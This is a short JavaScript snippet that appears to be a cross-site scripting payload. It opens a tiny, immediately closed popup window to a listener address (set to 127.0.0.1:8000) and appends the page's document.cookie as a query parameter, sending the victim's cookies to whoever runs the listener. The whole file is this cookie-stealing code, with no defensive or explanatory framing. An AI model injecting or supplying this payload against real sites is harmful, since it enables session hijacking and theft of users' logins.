var remoteAddr = "http://127.0.0.1:8000/";

//popup may get blocked by the browser
function Popup(listener){
    window.open(listener+"?cookie=" + document.cookie,'popUpWindow','height=10,width=10,left=100,top=100').close();

}
Popup(remoteAddr);
